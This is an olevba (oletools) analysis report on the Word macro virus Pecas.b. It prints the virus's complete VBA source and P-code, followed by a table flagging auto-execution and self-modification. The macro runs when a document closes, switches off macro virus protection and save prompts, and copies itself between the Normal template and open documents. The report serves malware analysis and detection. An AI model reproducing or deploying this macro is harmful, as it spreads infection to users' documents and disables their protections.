olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pecas.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Pecas.cls 
in file: Virus.MSWord.Pecas.b - OLE stream: 'Macros/VBA/Pecas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'by morris "vegueta"
'pequitas es mi novia
'mi viejo amigo " goto"
'dedicado para ti pequitas
'este virus tiene un bug en mi siguiente version lo solucionare
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = False
Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
Options.ConfirmConversions = (1 - 1)
Set plan = NormalTemplate.VBProject.VBComponents.Item(1)
Set activ = ActiveDocument.VBProject.VBComponents.Item(1)
Set temp = NormalTemplate.VBProject.VBComponents(1).CodeModule
bandera = 0
paso2:
cont = activ.CodeModule.countoflines
cont1 = plan.CodeModule.countoflines
var = plan.Name
If var = "Pecas" Then
  If activ.Name <> "Pecas" Then
   activ.CodeModule.DeleteLines 1, cont
    activ.CodeModule.InsertLines 1, temp.lines(1, cont1)
    activ.Name = plan.Name
      If bandera = 0 Then
      If InStr(1, ActiveDocument.Name, "Document") = 0 Then
        If Day(Now) = 13 Then Selection.TypeText "pequitas te amo"
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
       Else
       ActiveDocument.Saved = True
      End If
      End If
    End If
End If
bandera = bandera + 1
If bandera > 1 Then
Application.ScreenUpdating = False
Exit Sub
End If
Set activ = NormalTemplate.VBProject.VBComponents.Item(1)
Set plan = ActiveDocument.VBProject.VBComponents.Item(1)
Set temp = ActiveDocument.VBProject.VBComponents(1).CodeModule

GoTo paso2
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pecas.b
' ===============================================================================
' Module streams:
' Macros/VBA/Pecas - 3216 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0013 "by morris "vegueta""
' Line #2:
' 	QuoteRem 0x0000 0x0014 "pequitas es mi novia"
' Line #3:
' 	QuoteRem 0x0000 0x0016 "mi viejo amigo " goto""
' Line #4:
' 	QuoteRem 0x0000 0x0019 "dedicado para ti pequitas"
' Line #5:
' 	QuoteRem 0x0000 0x003E "este virus tiene un bug en mi siguiente version lo solucionare"
' Line #6:
' 	FuncDefn (Private Sub Document_Close())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #9:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set plan 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set activ 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set temp 
' Line #15:
' 	LitDI2 0x0000 
' 	St bandera 
' Line #16:
' 	Label paso2 
' Line #17:
' 	Ld activ 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cont 
' Line #18:
' 	Ld plan 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cont1 
' Line #19:
' 	Ld plan 
' 	MemLd New 
' 	St var 
' Line #20:
' 	Ld var 
' 	LitStr 0x0005 "Pecas"
' 	Eq 
' 	IfBlock 
' Line #21:
' 	Ld activ 
' 	MemLd New 
' 	LitStr 0x0005 "Pecas"
' 	Ne 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld cont 
' 	Ld activ 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld cont1 
' 	Ld temp 
' 	ArgsMemLd lines 0x0002 
' 	Ld activ 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #24:
' 	Ld plan 
' 	MemLd New 
' 	Ld activ 
' 	MemSt New 
' Line #25:
' 	Ld bandera 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "pequitas te amo"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld bandera 
' 	LitDI2 0x0001 
' 	Add 
' 	St bandera 
' Line #36:
' 	Ld bandera 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #38:
' 	ExitSub 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set activ 
' Line #41:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set plan 
' Line #42:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set temp 
' Line #43:
' Line #44:
' 	GoTo paso2 
' Line #45:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

